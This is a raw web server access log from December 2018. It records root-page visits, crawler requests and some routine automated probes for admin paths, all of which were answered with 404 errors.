177.11.142.39 - - [14/Dec/2018:17:34:05 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
105.184.140.4 - - [14/Dec/2018:17:42:07 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
5.188.210.53 - - [14/Dec/2018:17:44:25 +0000] "GET / HTTP/1.0" 301 194 "http://red-mammoth.ru/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36"
39.104.224.208 - - [14/Dec/2018:17:58:46 +0000] "GET /wp/wp-admin/ HTTP/1.1" 404 152 "-" "-"
119.93.122.92 - - [14/Dec/2018:18:25:14 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
138.201.255.45 - - [14/Dec/2018:19:49:34 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
37.9.113.70 - - [14/Dec/2018:19:50:50 +0000] "GET /robots.txt HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
213.180.203.59 - - [14/Dec/2018:19:50:51 +0000] "GET /robots.txt HTTP/1.1" 404 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
37.9.113.70 - - [14/Dec/2018:19:50:54 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
213.180.203.60 - - [14/Dec/2018:19:50:55 +0000] "GET / HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
186.34.182.32 - - [14/Dec/2018:19:55:40 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
186.34.182.32 - - [14/Dec/2018:19:55:44 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
186.34.182.32 - - [14/Dec/2018:19:55:47 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
186.34.182.32 - - [14/Dec/2018:19:55:53 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
186.34.182.32 - - [14/Dec/2018:19:56:10 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
178.162.0.128 - - [14/Dec/2018:20:21:16 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
220.133.20.38 - - [14/Dec/2018:20:32:45 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
185.201.72.251 - - [14/Dec/2018:20:46:33 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
103.73.62.216 - - [14/Dec/2018:20:48:23 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
128.232.21.75 - - [14/Dec/2018:21:04:00 +0000] "GET /. HTTP/0.0" 400 182 "-" "-"
206.189.169.33 - - [14/Dec/2018:21:27:01 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
5.30.34.83 - - [14/Dec/2018:21:58:19 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
159.203.42.143 - - [14/Dec/2018:21:58:20 +0000] "GET / HTTP/1.1" 200 396 "130.193.58.204" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
82.146.57.90 - - [14/Dec/2018:22:15:49 +0000] "GET / HTTP/1.1" 301 194 "-" "Go 1.1 package http"
14.234.248.237 - - [14/Dec/2018:22:31:12 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
178.165.10.248 - - [14/Dec/2018:22:39:43 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.219.11.151 - - [14/Dec/2018:22:57:32 +0000] "GET / HTTP/1.1" 400 182 "-" "-"
194.147.32.109 - - [14/Dec/2018:23:00:22 +0000] "GET //recordings/ HTTP/1.1" 404 152 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.14.4.el7.x86_64"
80.44.93.68 - - [14/Dec/2018:23:02:51 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
194.147.32.109 - - [14/Dec/2018:23:12:16 +0000] "GET / HTTP/1.1" 200 396 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.14.4.el7.x86_64"
5.249.93.178 - - [14/Dec/2018:23:19:43 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
194.147.32.109 - - [14/Dec/2018:23:24:37 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x13Z\xED\xB0\xA4\xECY\xE86\xA1\xC5\x08ux\xB2]\x04Y\xACwJ\xD0\xA2\xDF\xFB\x09\x93W\xDAi\xF1\x17\x00\x00\x8C\xC00\xC0,\xC02\xC0.\xC0/\xC0+\xC01\xC0-\x00\xA5\x00\xA3\x00\xA1\x00\x9F\x00\xA4\x00\xA2\x00\xA0\x00\x9E\xC0(\xC0$\xC0\x14\xC0" 400 182 "-" "-"
194.147.32.109 - - [14/Dec/2018:23:27:15 +0000] "GET //about.php HTTP/1.1" 404 152 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.14.4.el7.x86_64"
92.87.22.209 - - [14/Dec/2018:23:47:56 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
186.67.123.235 - - [15/Dec/2018:00:01:22 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
66.102.9.44 - - [15/Dec/2018:01:24:22 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
106.1.6.118 - - [15/Dec/2018:01:32:34 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
123.22.37.57 - - [15/Dec/2018:01:38:51 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
122.117.235.45 - - [15/Dec/2018:01:54:12 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
36.82.228.3 - - [15/Dec/2018:02:05:30 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
209.17.96.242 - - [15/Dec/2018:02:34:50 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
178.134.36.182 - - [15/Dec/2018:02:58:20 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
220.191.249.124 - - [15/Dec/2018:03:05:41 +0000] "GET /manager/html HTTP/1.1" 404 580 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
188.233.16.119 - - [15/Dec/2018:03:16:10 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
134.236.119.17 - - [15/Dec/2018:03:22:09 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
60.191.38.77 - - [15/Dec/2018:03:23:31 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
87.227.247.5 - - [15/Dec/2018:03:26:32 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
186.224.245.137 - - [15/Dec/2018:04:19:32 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
197.51.82.172 - - [15/Dec/2018:04:46:47 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
213.149.173.58 - - [15/Dec/2018:04:47:17 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
68.183.214.68 - - [15/Dec/2018:04:54:54 +0000] "GET / HTTP/1.1" 301 194 "http://itroot.org/cb/56874a3879" "Mozilla/4.0 (compatible;itroot/1.0;+http://itroot.org/)"
121.52.137.217 - - [15/Dec/2018:05:34:58 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
125.163.50.150 - - [15/Dec/2018:06:04:56 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
179.97.170.39 - - [15/Dec/2018:06:06:48 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
188.130.240.143 - - [15/Dec/2018:06:23:43 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
